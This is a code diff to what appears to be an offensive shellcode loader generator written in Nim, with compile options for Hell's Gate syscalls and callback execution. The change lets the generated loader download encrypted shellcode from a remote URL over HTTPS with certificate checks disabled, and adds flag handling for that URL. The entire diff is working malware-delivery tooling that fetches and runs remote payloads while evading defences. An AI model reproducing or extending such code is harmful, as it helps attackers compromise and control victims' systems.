@@ -856,8 +856,12 @@ var encString = fileHandle.readAll()
 
 let ShellcodeFromURLStub * = fmt"""
 
+import std/net
 import std/httpclient
-var client = newHttpClient()
+when defined(ssl):
+    var client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
+else:
+    var client = newHttpClient()
 var encString = client.getContent("{shellcodeURL}")
 
 """
@@ -1608,6 +1612,13 @@ if(denim):
 
 if(callbackexecute):
     basicCompileFlags.add("-d:Callback ")
+
+if (retrieveFromURL):
+    if(shellcodeURL.contains("https")):
+        basicCompileFlags.add("-d:ssl ")
+    elif(not shellcodeURL.contains("http")):
+        echo "[!] URL must contain http:// or https://"
+        quit()
 
 if(hellsgate):
     basicCompileFlags.add("-d:Hellsgate ")
